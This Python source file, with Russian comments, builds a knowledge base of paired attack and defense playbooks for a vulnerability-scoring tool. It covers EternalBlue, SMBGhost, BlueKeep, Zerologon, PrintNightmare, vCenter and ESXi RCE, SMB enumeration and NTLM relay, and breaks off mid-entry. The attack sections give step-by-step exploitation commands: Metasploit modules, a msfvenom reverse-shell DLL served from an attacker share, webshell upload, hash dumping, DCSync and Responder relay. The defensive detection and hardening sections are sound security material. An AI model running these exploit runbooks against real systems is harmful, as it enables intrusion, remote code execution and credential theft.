"""Сборщик курируемой базы методичек RVC -> rvc/methodics_kb.json.

Запуск (один раз, офлайн):  python -m rvc.build_methodics_kb

Зачем отдельный сборщик, а не рукописный JSON:
  * содержимое курируется и проверяется как код (триплет-строки, без экранирования);
  * результат детерминирован: один и тот же исходник -> один и тот же JSON;
  * провенанс задокументирован (источники в _meta), факты не выдумываются.

Каждое «семейство» атак содержит:
  execution        — профиль выполнения (привилегии/LAN/локальность/зрелость эксплойта),
                     его читает численная модель (scoring.py) для разделения ролей;
  attack_methodic  — полноценная методичка проведения атаки (фазы, команды, ожидаемый
                     результат, пояснение, инструменты, траблшутинг, зачистка);
  defense_methodic — зеркальная методичка защиты (детект, харднинг, патч, проверка).

Сопоставление вектор->семейство (methodics.py) идёт по CVE, затем по алиасам в
имени, затем по типу атаки (attack_type_fallback).
"""

from __future__ import annotations

import json
import os

# --------------------------------------------------------------------------- #
#  Вспомогательные конструкторы (уменьшают повторения и держат форму единой)
# --------------------------------------------------------------------------- #


def step(action: str, command: str, expected: str, explanation: str) -> dict:
    """Один шаг методички: что делаем, чем, что ждём, почему так."""
    return {"action": action, "command": command, "expected": expected, "explanation": explanation}


def phase(name: str, goal: str, steps: list[dict]) -> dict:
    """Фаза атаки (Разведка / Эксплуатация / Пост-эксплуатация / ...)."""
    return {"name": name, "goal": goal, "steps": steps}


def tool(name: str, install: str, purpose: str) -> dict:
    return {"name": name, "install": install, "purpose": purpose}


def execution(min_privilege: str, requires_lan: bool, is_local_only: bool,
              exploit_maturity: str, note: str = "", outcome_uncertain: str = "") -> dict:
    """Профиль выполнения атаки — вход для разделения ролей в численной модели.

    min_privilege    : none|user|admin|local — минимальные права для проведения.
    requires_lan     : нужна позиция в L2-сегменте жертвы (relay/MITM/poisoning).
    is_local_only    : действие локально на хосте, сетевого порта нет (дамп SAM).
    exploit_maturity : weaponized|poc|tooling|native — зрелость средств эксплуатации.
    outcome_uncertain: непустая строка, если УСПЕХ зависит от того, что по данным
                       сканера проверить нельзя (пароль при переборе, реальное
                       наличие беспарольного доступа, отключённая подпись и жертва).
                       Тогда оценка держится на «возможно» (жёлтый) с пометкой
                       «что уточнить» — даже если сервис достижим и запущен.
    """
    return {
        "min_privilege": min_privilege,
        "requires_lan": requires_lan,
        "is_local_only": is_local_only,
        "exploit_maturity": exploit_maturity,
        "note": note,
        "outcome_uncertain": outcome_uncertain,
    }


FAMILIES: dict[str, dict] = {}


def family(key: str, **payload) -> None:
    FAMILIES[key] = payload


# --------------------------------------------------------------------------- #
#  СЕМЕЙСТВА АТАК
# --------------------------------------------------------------------------- #

family(
    "ms17_010",
    title="EternalBlue / EternalRomance / EternalChampion (MS17-010) — RCE через SMBv1",
    aliases=["eternalblue", "eternalromance", "eternalchampion", "ms17-010", "ms17_010", "smbv1"],
    cves=["CVE-2017-0144", "CVE-2017-0145", "CVE-2017-0146", "CVE-2017-0147", "CVE-2017-0148"],
    attack_types=["remote_code_execution"],
    ports=[445, 139],
    execution=execution("none", False, False, "weaponized",
                        "Предаутентификационный RCE: эксплуатируется без учётных данных, если открыт SMBv1."),
    attack_methodic={
        "summary": (
            "MS17-010 — переполнение в обработчике SMBv1 (srv.sys), позволяющее выполнить код "
            "с правами SYSTEM удалённо и без аутентификации. Семейство Eternal* (Blue/Romance/Champion) "
            "различается техникой грумминга пула, цель одна — RCE на 445/TCP."
        ),
        "prerequisites": [
            "Сетевой доступ к 445/TCP (или 139/TCP) на цели.",
            "На цели включён протокол SMBv1.",
            "ОС из уязвимого диапазона и без патча MS17-010 (Windows Vista…Server 2016 / 10 до сборки с патчем).",
        ],
        "phases": [
            phase("Разведка", "Подтвердить SMBv1 и факт уязвимости", [
                step("Проверить наличие SMBv1",
                     "nmap -p445 --script smb-protocols <target>",
                     "В выводе присутствует строка SMBv1",
                     "Если SMBv1 отключён, ни один из Eternal* неприменим — это первый отсекающий признак."),
                step("Проверить уязвимость MS17-010",
                     "nmap -p445 --script smb-vuln-ms17-010 <target>",
                     "Скрипт сообщает 'VULNERABLE: Remote Code Execution (CVE-2017-0143)'",
                     "NSE-скрипт безопасно проверяет реакцию на специально оформленный запрос, не эксплуатируя."),
            ]),
            phase("Эксплуатация", "Получить сессию с правами SYSTEM", [
                step("Настроить и запустить модуль Metasploit",
                     "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
                     "set RHOSTS <target>; set LHOST <attacker>; run'",
                     "Открыта Meterpreter-сессия (getuid -> NT AUTHORITY\\SYSTEM)",
                     "EternalBlue нестабилен на части ядер; при сбое использовать ms17_010_psexec "
                     "(требует named pipe) или EternalRomance из модуля ms17_010_command."),
                step("Альтернатива без Metasploit",
                     "python eternalblue_exploit.py <target> shellcode.bin",
                     "Шелл-код выполнен, обратное соединение получено",
                     "Публичные PoC (worawit/MS17-010) полезны, когда msf-модуль падает на конкретной сборке."),
            ]),
            phase("Пост-эксплуатация", "Закрепиться и собрать доказательства", [
                step("Подтвердить контекст выполнения",
                     "meterpreter> getuid ; sysinfo",
                     "SYSTEM на целевой ОС",
                     "Фиксируем доказательство RCE для отчёта лаборатории."),
                step("Снять хэши (для разбора цепочки)",
                     "meterpreter> hashdump",
                     "Дамп NTLM-хэшей локальных учёток",
                     "Демонстрирует переход RCE -> кража учётных данных (T1003)."),
            ]),
        ],
        "tools": [
            tool("Nmap (NSE)", "apt install nmap", "Детект SMBv1 и проверка MS17-010"),
            tool("Metasploit Framework", "apt install metasploit-framework", "Готовый weaponized-эксплойт"),
            tool("worawit/MS17-010 PoC", "git clone https://github.com/worawit/MS17-010", "Резерв при сбое msf"),
        ],
        "troubleshooting": [
            "BSOD цели = неудачный грумминг пула; снизить нагрузку, повторить или сменить технику (Romance).",
            "Нет SMBv1 -> атака неприменима; искать другой вектор.",
            "Сработал антивирус на шелл-коде -> сменить payload (например, на staged meterpreter)/энкодер.",
        ],
        "cleanup": [
            "Закрыть сессии (sessions -K), удалить выгруженные артефакты.",
            "В учебной среде — зафиксировать тайминги для синего разбора.",
        ],
    },
    defense_methodic={
        "summary": "Закрыть SMBv1, применить MS17-010, ограничить 445/TCP на периметре и сегментах.",
        "detection": [
            "IDS/IPS сигнатуры на аномальные SMB Trans2/обращения к именованным каналам (ET EternalBlue).",
            "Windows Event ID 5145/5140 — необычные обращения к IPC$/admin-шарам.",
            "Всплеск SMB-трафика к 445 от нетипичных источников.",
        ],
        "hardening": [
            "Отключить SMBv1: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol.",
            "Сегментация и блокировка 445/139 на периметре и между VLAN.",
            "Включить SMB signing и требование SMBv3 с шифрованием.",
        ],
        "patch": "Установить обновление MS17-010 (March 2017) и последующие накопительные обновления.",
        "validation": [
            "nmap -p445 --script smb-protocols — SMBv1 отсутствует.",
            "nmap -p445 --script smb-vuln-ms17-010 — статус NOT VULNERABLE.",
        ],
    },
)

family(
    "smbghost",
    title="SMBGhost (CVE-2020-0796) — RCE/LPE через компрессию SMBv3.1.1",
    aliases=["smbghost", "coronablue", "cve-2020-0796", "smbv3"],
    cves=["CVE-2020-0796"],
    attack_types=["remote_code_execution"],
    ports=[445],
    execution=execution("none", False, False, "poc",
                        "Предаутентификационный, но публичные RCE-PoC капризны; LPE-вариант стабилен."),
    attack_methodic={
        "summary": (
            "Целочисленное переполнение в обработке сжатых сообщений SMBv3.1.1 (compression). "
            "Позволяет удалённый RCE без аутентификации и локальное повышение привилегий."
        ),
        "prerequisites": [
            "Открыт 445/TCP, SMB 3.1.1 с включённой компрессией.",
            "Windows 10/Server 1903–1909 без мартовского патча 2020.",
        ],
        "phases": [
            phase("Разведка", "Подтвердить уязвимый SMBv3.1.1", [
                step("Проверить версию и компрессию SMB",
                     "nmap -p445 --script smb-protocols <target>",
                     "Заявлен диалект 3.1.1",
                     "SMBGhost живёт только в 3.1.1 c compression-capability."),
                step("Точечный детект",
                     "python scanner.py <target>   # ollypwn/SMBGhost scanner",
                     "Vulnerable",
                     "Скан проверяет флаг компрессии в NEGOTIATE без эксплуатации."),
            ]),
            phase("Эксплуатация", "LPE или осторожный RCE", [
                step("Локальное повышение привилегий (стабильно)",
                     "SMBGhost_LPE.exe   # на хосте под низкими правами",
                     "Контекст SYSTEM",
                     "LPE-PoC надёжен; применяется когда уже есть код на хосте."),
                step("Удалённый RCE (нестабильно)",
                     "python3 exploit.py -ip <target>",
                     "Reverse shell / BSOD при неудаче",
                     "RCE-PoC часто роняет цель в BSOD — в учебной среде применять осознанно."),
            ]),
        ],
        "tools": [
            tool("ollypwn SMBGhost scanner", "git clone https://github.com/ollypwn/SMBGhost", "Безопасный детект"),
            tool("ZecOps/chompie1337 PoC", "git clone (public PoC)", "RCE/LPE PoC"),
        ],
        "troubleshooting": [
            "BSOD при RCE -> переключиться на LPE-сценарий или другой вектор.",
            "Диалект < 3.1.1 -> неприменимо.",
        ],
        "cleanup": ["Удалить выгруженные PoC, перезагрузить при нестабильности SMB-стека."],
    },
    defense_methodic={
        "summary": "Патч KB4551762, отключить SMBv3-компрессию, ограничить 445.",
        "detection": ["Сетевые сигнатуры на сжатые SMB3 transform-заголовки от неожиданных источников."],
        "hardening": [
            "Отключить компрессию: Set-ItemProperty 'HKLM:\\...\\LanmanServer\\Parameters' DisableCompression 1.",
            "Блокировать 445/TCP на периметре.",
        ],
        "patch": "KB4551762 (март 2020) и новее.",
        "validation": ["ollypwn scanner -> Not vulnerable", "Реестр DisableCompression=1"],
    },
)

family(
    "bluekeep",
    title="BlueKeep (CVE-2019-0708) — RCE через RDP (pre-auth)",
    aliases=["bluekeep", "cve-2019-0708", "rdp rce"],
    cves=["CVE-2019-0708"],
    attack_types=["remote_code_execution", "os_specific"],
    ports=[3389],
    execution=execution("none", False, False, "weaponized",
                        "Pre-auth RCE в RDP (termdd.sys), msf-модуль доступен, но рискует BSOD."),
    attack_methodic={
        "summary": (
            "Use-after-free в канале MS_T120 службы RDP до аутентификации. Позволяет RCE без логина "
            "на старых ОС (Win7/Server 2008 R2 и ранее)."
        ),
        "prerequisites": [
            "Открыт 3389/TCP (RDP).",
            "Windows 7 / Server 2008(R2) / XP / 2003 без патча мая 2019.",
            "NLA (Network Level Authentication) отключён или не обязателен.",
        ],
        "phases": [
            phase("Разведка", "Подтвердить уязвимый RDP", [
                step("Проверить уязвимость",
                     "nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info <target>  ; "
                     "msf> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
                     "Модуль сообщает 'The target is vulnerable'",
                     "Скан-модуль msf специально различает уязвимые/пропатченные стеки RDP."),
            ]),
            phase("Эксплуатация", "Получить SYSTEM", [
                step("Запустить эксплойт с подбором цели",
                     "msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; "
                     "set RHOSTS <target>; set target <id>; run",
                     "Meterpreter SYSTEM",
                     "Обязательно выбрать правильный target (виртуализация/железо) — иначе BSOD."),
            ]),
        ],
        "tools": [
            tool("Metasploit", "apt install metasploit-framework", "Скан и RCE BlueKeep"),
            tool("rdpscan (zerosum0x0)", "git clone", "Массовый детект BlueKeep"),
        ],
        "troubleshooting": [
            "BSOD -> неверный target/раскладка памяти; уточнить параметр target.",
            "Включён NLA -> pre-auth путь закрыт, BlueKeep неприменим.",
        ],
        "cleanup": ["Закрыть сессии; в учебной среде перезагрузить цель при нестабильности."],
    },
    defense_methodic={
        "summary": "Патч CVE-2019-0708, включить NLA, ограничить RDP, по возможности — шлюз RDG/VPN.",
        "detection": ["Аномальные обращения к каналу MS_T120; всплеск подключений к 3389."],
        "hardening": ["Включить NLA (обязательная аутентификация до RDP-стека).", "Не публиковать RDP в интернет — только через VPN/RDG."],
        "patch": "Обновление мая 2019 (CVE-2019-0708).",
        "validation": ["msf bluekeep scanner -> safe/patched", "RDP требует NLA"],
    },
)

family(
    "zerologon",
    title="Zerologon (CVE-2020-1472) — обход аутентификации Netlogon -> захват домена",
    aliases=["zerologon", "cve-2020-1472", "netlogon"],
    cves=["CVE-2020-1472"],
    attack_types=["authentication_bypass", "remote_code_execution", "os_specific"],
    ports=[135, 445],
    execution=execution("none", False, False, "weaponized",
                        "Сбрасывает пароль учётки контроллера домена через крипто-дефект Netlogon; цель — именно DC."),
    attack_methodic={
        "summary": (
            "Дефект в AES-CFB8 Netlogon (ComputeNetlogonCredential): нулевой IV позволяет за ~256 попыток "
            "аутентифицироваться как контроллер домена и обнулить его машинный пароль -> полный захват AD."
        ),
        "prerequisites": [
            "Сетевой доступ к контроллеру домена (Netlogon поверх RPC, 135 + динамические порты).",
            "DC без патча августа 2020.",
            "Цель должна быть именно контроллером домена (не рядовой Windows-хост).",
        ],
        "phases": [
            phase("Разведка", "Убедиться, что цель — DC", [
                step("Идентифицировать роль",
                     "nmap -p389,88,135 <target> ; nltest /dsgetdc:<domain>",
                     "Открыты LDAP/Kerberos/RPC, цель отвечает как DC",
                     "Zerologon бессмысленен против не-DC: учётка, которую сбрасываем, — машинная учётка DC."),
            ]),
            phase("Эксплуатация", "Сбросить пароль DC", [
                step("Проверить уязвимость (без изменения)",
                     "python3 zerologon_tester.py <DC_NETBIOS> <DC_IP>",
                     "'Success! DC is vulnerable'",
                     "Тестер не меняет пароль — только проверяет реакцию."),
                step("Сбросить машинный пароль DC",
                     "python3 cve-2020-1472-exploit.py <DC_NETBIOS> <DC_IP>",
                     "Пароль учётки DC$ обнулён в AD",
                     "ВНИМАНИЕ: ломает доверие хоста к домену — обязательна процедура восстановления (ниже)."),
            ]),
            phase("Пост-эксплуатация", "Использовать и ВОССТАНОВИТЬ", [
                step("Сделать DCSync (вытащить хэши)",
                     "secretsdump.py -no-pass <domain>/<DC_NETBIOS>\\$@<DC_IP>",
                     "Дамп NTDS (включая krbtgt) ",
                     "Демонстрирует переход к полному контролю над доменом."),
                step("Восстановить пароль DC (КРИТИЧНО)",
                     "secretsdump -> взять оригинальный hex; reinstall_original_pw.py <DC> <IP> <hex>",
                     "Доверие восстановлено",
                     "Без восстановления DC выпадает из домена — в учебной среде шаг обязателен."),
            ]),
        ],
        "tools": [
            tool("Impacket (secretsdump)", "pip install impacket", "DCSync и восстановление пароля"),
            tool("SecuraBV Zerologon", "git clone https://github.com/SecuraBV/CVE-2020-1472", "Тестер уязвимости"),
        ],
        "troubleshooting": [
            "Цель не DC -> эксплойт неприменим.",
            "DC потерял доверие -> немедленно выполнить процедуру восстановления пароля.",
        ],
        "cleanup": ["Обязательно восстановить машинный пароль DC; сменить krbtgt дважды после учений."],
    },
    defense_methodic={
        "summary": "Патч августа 2020 + enforcement-режим Netlogon; мониторинг аномальных смен паролей DC.",
        "detection": [
            "Event ID 4742 (смена машинной учётки DC) из неожиданного источника.",
            "Event ID 5829/5827/5828 (отклонённые уязвимые Netlogon-подключения после патча).",
        ],
        "hardening": ["Включить enforcement secure RPC для Netlogon (FullSecureChannelProtection=1)."],
        "patch": "CVE-2020-1472 (август 2020) + февральский enforcement 2021.",
        "validation": ["zerologon_tester -> Not vulnerable", "В логах есть 5829 при попытках уязвимого Netlogon"],
    },
)

family(
    "printnightmare",
    title="PrintNightmare (CVE-2021-34527/1675) — RCE/LPE через Print Spooler",
    aliases=["printnightmare", "cve-2021-34527", "cve-2021-1675", "spooler"],
    cves=["CVE-2021-34527", "CVE-2021-1675"],
    attack_types=["remote_code_execution"],
    ports=[135, 445],
    execution=execution("user", False, False, "weaponized",
                        "Удалённый вектор требует валидной (даже непривилегированной) доменной учётки; результат — SYSTEM."),
    attack_methodic={
        "summary": (
            "Служба Print Spooler (RpcAddPrinterDriverEx / MS-RPRN) позволяет аутентифицированному "
            "пользователю загрузить произвольный драйвер и выполнить код с правами SYSTEM удалённо."
        ),
        "prerequisites": [
            "Служба Spooler запущена на цели.",
            "Доступ к 135/445 и доменная учётная запись (любая, даже непривилегированная).",
            "SMB-шар с DLL-«драйвером», доступный цели.",
        ],
        "phases": [
            phase("Разведка", "Подтвердить активный Spooler", [
                step("Проверить интерфейс MS-RPRN",
                     "rpcdump.py @<target> | egrep -i 'MS-RPRN|spoolss'",
                     "Интерфейс spoolss присутствует",
                     "Если Spooler остановлен/отключён, вектор закрыт."),
            ]),
            phase("Эксплуатация", "Загрузить драйвер и выполнить код", [
                step("Поднять SMB-шар с полезной DLL",
                     "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<atk> -f dll -o evil.dll ; "
                     "smbserver.py share ./ -smb2support",
                     "Шар доступен цели",
                     "DLL выступает «драйвером печати», который Spooler загрузит с привилегиями SYSTEM."),
                step("Запустить PrintNightmare",
                     "python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> "
                     "'\\\\<atk>\\share\\evil.dll'",
                     "Reverse shell с правами SYSTEM",
                     "cube0x0/CVE-2021-1675 — рабочая реализация поверх Impacket."),
            ]),
        ],
        "tools": [
            tool("Impacket", "pip install impacket", "rpcdump/smbserver/аутентификация"),
            tool("cube0x0 PrintNightmare", "git clone https://github.com/cube0x0/CVE-2021-1675", "Эксплойт"),
        ],
        "troubleshooting": [
            "Spooler остановлен -> неприменимо.",
            "Драйвер не подхватился -> проверить доступность SMB-шары и архитектуру DLL.",
        ],
        "cleanup": ["Удалить загруженные драйверы печати, остановить временный SMB-сервер."],
    },
    defense_methodic={
        "summary": "Патч июля 2021, остановить/ограничить Spooler, запретить удалённую установку драйверов.",
        "detection": ["Event ID 808/316 Print Service — загрузка драйверов; новые DLL в spool\\drivers."],
        "hardening": [
            "Отключить Spooler где не нужен: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled.",
            "GPO 'Point and Print Restrictions' -> запрет неадмин-установки драйверов.",
        ],
        "patch": "CVE-2021-34527 (июль 2021).",
        "validation": ["rpcdump без spoolss на серверах, где Spooler отключён", "GPO ограничивает установку драйверов"],
    },
)

family(
    "vcenter_rce",
    title="VMware vCenter (CVE-2021-21972 / CVE-2021-21985) — RCE через плагин vSphere Client",
    aliases=["vcenter", "cve-2021-21972", "cve-2021-21985", "vsphere"],
    cves=["CVE-2021-21972", "CVE-2021-21985"],
    attack_types=["remote_code_execution"],
    ports=[443, 8443, 902],
    execution=execution("none", False, False, "weaponized",
                        "Pre-auth RCE, НО только против vCenter Server. Против VMware Workstation/ESXi-демона неприменимо."),
    attack_methodic={
        "summary": (
            "Уязвимости в плагинах vSphere Client (vROPS / VSAN Health) vCenter Server: неаутентифицированная "
            "загрузка файла (21972) и инъекция в vSAN (21985) -> RCE на сервере vCenter."
        ),
        "prerequisites": [
            "Цель — именно VMware vCenter Server 6.5/6.7/7.0 (веб-интерфейс vSphere Client).",
            "Доступ к 443/TCP веб-интерфейса.",
            "Сервер без патча февраля/мая 2021.",
        ],
        "phases": [
            phase("Разведка", "Подтвердить, что это vCenter, а не другой VMware-продукт", [
                step("Идентифицировать продукт",
                     "curl -sk https://<target>/ui/ | grep -i vcenter ; "
                     "nmap -p443 -sV <target>",
                     "Признаки vSphere Client / vCenter в ответе",
                     "КЛЮЧЕВОЙ отсев: порты 902/912 VMware Workstation НЕ равны vCenter — для них этот CVE неприменим."),
                step("Проверить уязвимый эндпоинт",
                     "curl -sk https://<target>/ui/vropspluginui/rest/services/uploadova -I",
                     "HTTP 405/200 вместо 404 -> плагин присутствует",
                     "404 означает, что уязвимый плагин отсутствует/пропатчен."),
            ]),
            phase("Эксплуатация", "Загрузить webshell и выполнить код", [
                step("Запустить эксплойт",
                     "python3 CVE-2021-21972.py -t <target> -f shell.jsp",
                     "Webshell загружен, RCE подтверждён",
                     "Эксплойт кладёт JSP/webshell в доступный путь и выполняет команды."),
            ]),
        ],
        "tools": [
            tool("Nmap", "apt install nmap", "Идентификация продукта/версии"),
            tool("Публичный PoC CVE-2021-21972", "git clone (public PoC)", "Загрузка webshell"),
        ],
        "troubleshooting": [
            "Продукт оказался VMware Workstation (902/912) -> CVE неприменим, понизить до 'не реализуемо'.",
            "Эндпоинт отдаёт 404 -> плагин пропатчен/удалён.",
        ],
        "cleanup": ["Удалить загруженный webshell, проверить /statsreport и tmp на артефакты."],
    },
    defense_methodic={
        "summary": "Патч VMSA-2021-0002/0010, отключить неиспользуемые плагины, не публиковать vCenter наружу.",
        "detection": ["POST на /ui/vropspluginui/... ; новые .jsp в каталогах vsphere-client."],
        "hardening": ["Ограничить доступ к vCenter управляющей сетью; отключить vROPS-плагин, если не используется."],
        "patch": "VMware VMSA-2021-0002 (фев 2021), VMSA-2021-0010 (май 2021).",
        "validation": ["Уязвимый эндпоинт отдаёт 404", "Версия vCenter выше патча"],
    },
)

family(
    "esxi_slp",
    title="VMware ESXi OpenSLP (CVE-2020-3992 / CVE-2021-21974) — RCE через SLP",
    aliases=["esxi", "openslp", "cve-2020-3992", "cve-2021-21974", "slp"],
    cves=["CVE-2020-3992", "CVE-2021-21974"],
    attack_types=["remote_code_execution"],
    ports=[427],
    execution=execution("none", False, False, "poc",
                        "Use-after-free в OpenSLP ESXi; цель — гипервизор ESXi, не Workstation."),
    attack_methodic={
        "summary": "Уязвимость в службе OpenSLP (427/TCP-UDP) хоста ESXi позволяет удалённый RCE без аутентификации.",
        "prerequisites": ["Цель — хост ESXi с включённой службой SLP.", "Доступ к 427.", "ESXi без патча."],
        "phases": [
            phase("Разведка", "Подтвердить ESXi+SLP", [
                step("Проверить службу SLP",
                     "nmap -p427 -sV <target>",
                     "Открыт 427 (svrloc)",
                     "Без активного OpenSLP вектор закрыт."),
            ]),
            phase("Эксплуатация", "RCE через SLP", [
                step("Запустить PoC",
                     "python3 esxi_slp_exploit.py <target>",
                     "Выполнение кода на гипервизоре",
                     "PoC формирует вредоносный SLP-пакет, переполняющий буфер службы."),
            ]),
        ],
        "tools": [tool("Nmap", "apt install nmap", "Детект SLP"), tool("Публичный PoC", "git clone", "Эксплуатация")],
        "troubleshooting": ["Это не ESXi (например, Workstation) -> неприменимо."],
        "cleanup": ["Перезапустить службы при нестабильности."],
    },
    defense_methodic={
        "summary": "Отключить OpenSLP на ESXi (VMware рекомендует), применить патч, ограничить 427.",
        "detection": ["Аномальный SLP-трафик к 427 на хостах ESXi."],
        "hardening": ["Отключить SLP: /etc/init.d/slpd stop; esxcli network firewall ruleset set -r CIMSLP -e false."],
        "patch": "VMware VMSA-2020-0023 / VMSA-2021-0002.",
        "validation": ["427 закрыт/служба остановлена"],
    },
)

family(
    "rpc_enum",
    title="RPC Enumeration (135/TCP) — разведка через MS-RPC/DCOM",
    aliases=["rpc enumeration", "rpc enum", "dcom exploitation", "endpoint mapper"],
    cves=[],
    attack_types=["information_disclosure", "reconnaissance"],
    ports=[135],
    execution=execution("none", False, False, "native",
                        "Штатный сетевой сервис Windows; перечисление возможно анонимно или с минимальными правами."),
    attack_methodic={
        "summary": (
            "Endpoint Mapper (135/TCP) выдаёт список зарегистрированных RPC-интерфейсов и динамических портов. "
            "Это основа разведки Windows-инфраструктуры и поиска уязвимых служб (Spooler, Netlogon, EFSRPC)."
        ),
        "prerequisites": ["Доступ к 135/TCP."],
        "phases": [
            phase("Разведка", "Снять карту RPC-интерфейсов", [
                step("Дамп endpoint mapper",
                     "rpcdump.py <target>   # Impacket",
                     "Список интерфейсов (UUID) и привязок к портам",
                     "По UUID видно, какие службы доступны (MS-RPRN, MS-EFSR, MS-NRPC и т.д.)."),
                step("Поиск опасных интерфейсов",
                     "rpcdump.py <target> | egrep -i 'MS-RPRN|MS-EFSR|MS-NRPC|MS-PAR'",
                     "Найдены Spooler/EFS/Netlogon",
                     "Эти интерфейсы — точки входа PrintNightmare/PetitPotam/Zerologon."),
            ]),
        ],
        "tools": [tool("Impacket (rpcdump)", "pip install impacket", "Перечисление RPC"),
                  tool("Nmap NSE", "apt install nmap", "msrpc-enum")],
        "troubleshooting": ["135 закрыт -> перечисление невозможно по EPM (искать прямые порты)."],
        "cleanup": ["Разведка не оставляет изменений; зафиксировать вывод для отчёта."],
    },
    defense_methodic={
        "summary": "Ограничить доступ к 135 и динамическому диапазону RPC, фильтровать RPC на периметре.",
        "detection": ["Множественные EPM-запросы (rpcdump-паттерн) от одного источника."],
        "hardening": ["Закрыть 135 на периметре; настроить фиксированный диапазон RPC и правила брандмауэра."],
        "patch": "Не уязвимость как таковая; устраняйте конкретные опасные интерфейсы (Spooler/Netlogon).",
        "validation": ["135 недоступен извне", "rpcdump извне не отвечает"],
    },
)

family(
    "smb_enum",
    title="SMB Enumeration / Null Session (445/TCP) — разведка ресурсов и учёток",
    aliases=["smb enumeration", "smb enum", "smb null session", "null session",
             "smb version", "smb2", "enum domains"],
    cves=[],
    attack_types=["information_disclosure", "reconnaissance"],
    ports=[445, 139],
    execution=execution("none", False, False, "native",
                        "Анонимная (null session) или low-priv разведка SMB: шары, пользователи, политики."),
    attack_methodic={
        "summary": "Перечисление SMB-ресурсов, пользователей, групп и политик паролей, в т.ч. через нулевую сессию.",
        "prerequisites": ["Доступ к 445/TCP (или 139)."],
        "phases": [
            phase("Разведка", "Снять шары и учётки", [
                step("Список общих папок",
                     "smbclient -L //<target>/ -N ; nmap -p445 --script smb-enum-shares <target>",
                     "Перечень доступных шар",
                     "-N = без пароля (нулевая сессия); видно, что доступно анонимно."),
                step("Перечисление пользователей/политик",
                     "enum4linux -a <target>   # или enum4linux-ng -A",
                     "Пользователи, группы, политика паролей, OS-инфо",
                     "Список учёток -> основа для брутфорса/Kerberoasting/Password spraying."),
                step("Современный инструмент",
                     "netexec smb <target> -u '' -p '' --shares --users",
                     "Шары и пользователи (если null session разрешён)",
                     "netexec (бывш. CrackMapExec) удобен для массовой SMB-разведки."),
            ]),
        ],
        "tools": [
            tool("smbclient", "apt install smbclient", "Доступ к SMB-шарам"),
            tool("enum4linux-ng", "pip install enum4linux-ng", "Комплексная SMB-разведка"),
            tool("NetExec", "pipx install netexec", "Массовое перечисление SMB"),
        ],
        "troubleshooting": ["Null session запрещён -> нужны валидные учётки (RestrictAnonymous=1)."],
        "cleanup": ["Разведка без изменений; сохранить списки для отчёта."],
    },
    defense_methodic={
        "summary": "Запретить анонимный доступ (RestrictAnonymous), ограничить SMB, минимизировать публичные шары.",
        "detection": ["Множественные обращения к IPC$/перечисление SAMR/LSARPC от одного источника (Event 5145)."],
        "hardening": ["RestrictAnonymous=1, RestrictAnonymousSAM=1; убрать лишние шары; сетевая сегментация."],
        "patch": "Конфигурационная мера, не патч.",
        "validation": ["smbclient -L -N не отдаёт шар/учёток", "enum4linux извне пуст"],
    },
)

family(
    "smb_relay",
    title="SMB Relay / NTLM Relay / SMB Signing Disabled (445) — ретрансляция аутентификации",
    aliases=["smb relay", "ntlm relay", "ntlm hash passback", "smb signing disabled",
             "smb signing", "signing not required"],
    cves=[],
    attack_types=["relay_attack", "man_in_the_middle", "credential_theft"],
    ports=[445, 139],
    execution=execution("user", True, False, "weaponized",
                        "Требует позиции в L2-сегменте (poisoning/перехват) — извне периметра неприменимо.",
                        outcome_uncertain="Нужно подтвердить отключённую подпись SMB на цели и наличие "
                        "жертвы, инициирующей аутентификацию в сегменте."),
    attack_methodic={
        "summary": (
            "Перехват NetNTLM-аутентификации (LLMNR/NBT-NS/mDNS poisoning или принуждение) и ретрансляция её "
            "на цель, где не требуется SMB signing -> выполнение от имени жертвы, дамп SAM, RCE."
        ),
        "prerequisites": [
            "Позиция в одном L2-сегменте с жертвами (для отравления имён/перехвата).",
            "На цели ретрансляции отключён/не требуется SMB signing.",
            "Жертва инициирует аутентификацию (или её принуждают, напр. PetitPotam).",
        ],
        "phases": [
            phase("Разведка", "Найти цели без SMB signing", [
                step("Проверить signing по сети",
                     "netexec smb <subnet>/24 --gen-relay-list targets.txt",
                     "Список хостов с signing:False",
                     "Ретрансляция возможна только туда, где подпись не обязательна."),
            ]),
            phase("Перехват+ретрансляция", "Получить доступ от имени жертвы", [
                step("Запустить ретранслятор",
                     "ntlmrelayx.py -tf targets.txt -smb2support -socks",
                     "Ожидание входящей аутентификации",
                     "ntlmrelayx примет перехваченную аутентификацию и переправит на цели."),
                step("Спровоцировать/перехватить аутентификацию",
                     "responder -I <iface> -wf   (LLMNR/NBT-NS poisoning)",
                     "Жертва аутентифицируется -> ntlmrelayx дампит SAM/создаёт сессию",
                     "Responder отвечает на широковещательные запросы имён, перенаправляя жертв на атакующего."),
            ]),
        ],
        "tools": [
            tool("Responder", "apt install responder", "LLMNR/NBT-NS/mDNS poisoning"),
            tool("Impacket (ntlmrelayx)", "pip install impacket", "NTLM-ретрансляция"),
            tool("NetExec", "pipx install netexec", "Поиск целей без signing"),
        ],
        "troubleshooting": [
            "Везде включён signing -> ретрансляция на SMB невозможна (пробовать LDAP/AD CS — ESC8).",
            "Нет L2-доступа (атакующий за маршрутизатором/периметром) -> вектор закрыт.",
        ],
        "cleanup": ["Остановить Responder/ntlmrelayx; в учебной сети — не оставлять отравление имён."],
    },
    defense_methodic={
        "summary": "Включить обязательный SMB signing, отключить LLMNR/NBT-NS, перейти на Kerberos, EPA для AD CS.",
        "detection": ["Несколько ответов на LLMNR/NBT-NS; вход с одной учётки на множестве хостов; ARP/имя-аномалии."],
        "hardening": [
            "GPO: Microsoft network server: Digitally sign communications (always) = Enabled.",
            "Отключить LLMNR и NBT-NS через GPO; включить SMB Encryption.",
        ],
        "patch": "Конфигурация + CVE PetitPotam (KB обновления EFSRPC).",
        "validation": ["netexec smb --gen-relay-list пуст (signing:True везде)", "LLMNR/NBT-NS отключены"],
    },
)

family(
    "mysql_bruteforce",
    title="MySQL Brute Force (3306) — подбор учётных данных СУБД",
    aliases=["mysql brute force", "mysql brute"],
    cves=[],
    attack_types=["brute_force"],
    ports=[3306],
    execution=execution("none", False, False, "tooling",
                        "Сетевой подбор; успех зависит от слабости паролей и отсутствия блокировок.",
                        outcome_uncertain="Пароль заранее неизвестен: сервис достижим и запущен, "
